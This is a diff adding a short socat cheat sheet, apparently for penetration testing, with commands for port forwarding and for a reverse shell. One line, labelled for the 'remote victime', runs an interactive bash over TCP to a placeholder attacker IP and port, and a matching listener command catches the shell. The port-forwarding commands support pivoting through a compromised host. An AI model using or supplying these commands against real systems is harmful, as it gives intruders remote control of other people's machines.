@@ -1,0 +1,13 @@
+% socat
+
+# socat port forwarding listener (on local machine)
+socat TCP-LISTEN:<port_listener>,fork,reuseaddr TCP-LISTEN:<port_to_forward> 
+
+# socat port forwarding connect (on remote machine)
+socat TCP:<connect_ip>:<connect_port> TCP:127.0.0.1:<port_to_forward> 
+
+# socat reverse shell (remote victime)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listner_ip>:<listner_port> 
+
+# socat reverse shell listener (local)
+socat file:`tty`,raw,echo=0 tcp-listen:<listner_port|4444> 
